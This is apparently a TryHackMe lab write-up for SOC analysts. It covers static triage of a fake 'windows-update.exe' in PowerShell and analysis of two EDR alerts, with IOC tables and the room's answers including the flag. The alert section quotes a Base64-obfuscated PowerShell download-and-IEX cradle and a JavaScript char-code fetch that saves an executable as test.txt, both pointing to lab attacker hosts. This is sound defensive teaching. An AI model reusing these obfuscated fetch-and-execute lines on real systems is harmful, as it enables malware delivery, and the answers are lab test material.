# TryHackMe: Shadow Trace — Writeup

**Room:** [Shadow Trace](https://tryhackme.com/room/shadowtrace) · SOC Level 1 › Malware Concepts for SOC · Premium · ~45 min
**Completed:** 2026-11-24 · 3/3 tasks · 270 pts

## Scenario

A night-shift SOC analyst gets a suspicious "company updater" (`windows-update.exe`) from a user's machine, plus two EDR alerts. Goal: identify the binary, pull IOCs, and correlate the alerts.

## Environment

- Windows analysis VM (in-browser split view), binary at `C:\Users\DFIRUser\Desktop\windows-update.exe`
- Tools available under `C:\Users\DFIRUser\DFIR Tools` (not needed — everything was done in PowerShell ISE)
- Task 3 alerts on a static EDR dashboard: `https://static-labs.tryhackme.cloud/apps/shadow-trace/`

---

## Task 2 — File analysis

### Hash

```powershell
Get-FileHash C:\Users\DFIRUser\Desktop\windows-update.exe -Algorithm SHA256 | fl
```

### Architecture — read the PE header directly

The PE header offset is at `0x3C`; the Machine field is 2 bytes after the `PE\0\0` signature.

```powershell
$b=[IO.File]::ReadAllBytes('C:\Users\DFIRUser\Desktop\windows-update.exe')
$pe=[BitConverter]::ToInt32($b,0x3c)
'{0:X4}' -f [BitConverter]::ToUInt16($b,$pe+4)
# 8664  -> IMAGE_FILE_MACHINE_AMD64 (x64). (014C would be x86.)
```

### Strings — a PowerShell "strings" substitute

Decode the bytes as both ASCII and UTF-16LE, then regex them:

```powershell
$a=[Text.Encoding]::ASCII.GetString($b); $u=[Text.Encoding]::Unicode.GetString($b)

# URLs
[regex]::Matches($a+$u,'https?://[\x21-\x7e]{4,}') | % Value | sort -u

# Domains / Base64-looking blobs
[regex]::Matches($a+$u,'[A-Za-z0-9+/]{16,}={0,2}|[\w.-]+\.(com|net|org|io|thm)\b') | % Value | sort -u

# Context: domains, padded Base64, DLL imports
[regex]::Matches($a+$u,'[\x20-\x7e]{6,}') | % Value | sls 'responses|=$|THM|flag|\.dll'
```

Notable strings:

| String | Meaning |
|---|---|
| `http://tryhatme.com/update/security-update.exe` | Download URL (typosquat of tryhackme.com) |
| `responses.tryhatme.com` | C2/response domain |
| `tryhatme.com/VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=` | Base64 path → flag |
| `external-attacker.thm:25` + "Connected…/Failed to connect…" | SMTP (port 25) callout |
| `WS2_32.dll`, `WININET.dll`, `urlmon.dll` | Sockets, HTTP, `URLDownloadToFileA` |
| `IsDebuggerPresent`, `K32EnumProcesses` | Anti-debug / process enumeration |

### Decode the flag (on-box, avoids misreading characters)

```powershell
$s=([regex]::Match($a,'VEhN[A-Za-z0-9+/=]+')).Value
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))
```

`VEhN` is Base64 for `THM`, a handy anchor for finding encoded flags.

### Answers

| Question | Answer |
|---|---|
| Architecture | `64-bit` |
| SHA-256 | `b2a88de3e3bcfae4a4b38fa36e884c586b5cb2c2c283e71fba59efdb9ea64bfc` |
| URL IOC | `http://tryhatme.com/update/security-update.exe` |
| Domain IOC | `responses.tryhatme.com` |
| Decoded flag | `THM{you_g0t_some_IOCs_friend}` |
| Socket library | `ws2_32.dll` |

---

## Task 3 — Alerts analysis

The split-view dashboard is an iframe; the full-screen link was easier to read. Two Critical alerts, both on `WIN-SRV-01.tryhackme.local` as `CORPsvc_backup`:

**1. Suspicious PowerShell execution (`powershell.exe`, 05:55)**

```powershell
(new-object system.net.webclient).DownloadString([Text.Encoding]::UTF8.GetString(
  [Convert]::FromBase64String("aHR0cHM6Ly90cnloYXRtZS5jb20vZGV2L21haW4uZXhl"))) | IEX;
```

Classic download cradle: Base64-hidden URL → `DownloadString` → `IEX` (in-memory execution).
Decoded: `https://tryhatme.com/dev/main.exe`

**2. Suspicious Browser Download (`chrome.exe`, 06:55)**

```javascript
fetch([104,116,116,112,115,58,47,47, ... ,101,120,101].map(c=>String.fromCharCode(c)).join(''))
  .then(r=>r.blob()).then(b=>{ ... a.download='test.txt'; a.click(); ... });
```

URL hidden as a char-code array; the payload is saved under a benign-looking name.
Decoded: `https://reallysecureupdate.tryhatme.com/update.exe`, saved as `test.txt`

Decoding on the Kali side:

```bash
echo aHR0cHM6Ly90cnloYXRtZS5jb20vZGV2L21haW4uZXhl | base64 -d
python3 -c "print(''.join(map(chr,[104,116,116,112,115,58,47,47,...])))"
```

### Answers

| Question | Answer |
|---|---|
| Malicious URL (powershell.exe) | `https://tryhatme.com/dev/main.exe` |
| Malicious URL (chrome.exe) | `https://reallysecureupdate.tryhatme.com/update.exe` |
| File saved (chrome.exe) | `test.txt` |

---

## IOC summary

| Type | Value |
|---|---|
| SHA-256 | `b2a88de3e3bcfae4a4b38fa36e884c586b5cb2c2c283e71fba59efdb9ea64bfc` |
| Domain | `tryhatme.com`, `responses.tryhatme.com`, `reallysecureupdate.tryhatme.com` |
| URL | `http://tryhatme.com/update/security-update.exe` |
| URL | `https://tryhatme.com/dev/main.exe` |
| URL | `https://reallysecureupdate.tryhatme.com/update.exe` |
| Host:port | `external-attacker.thm:25` |
| Host / account | `WIN-SRV-01.tryhackme.local` / `CORPsvc_backup` |
| Filename | `windows-update.exe`, `test.txt` |

## Takeaways

- PowerShell alone covers basic static triage: `Get-FileHash`, PE Machine field, and ASCII+UTF-16 regex in place of `strings`.
- Search both encodings; Windows binaries often store strings as UTF-16.
- Typosquatted domains (`tryhatme` vs `tryhackme`) are a fast IOC tell.
- Recognize the common obfuscation patterns: Base64 + `IEX` cradles in PowerShell, char-code arrays in JavaScript.
- Decode on the analysis box when possible so OCR or retyping can't corrupt a flag.
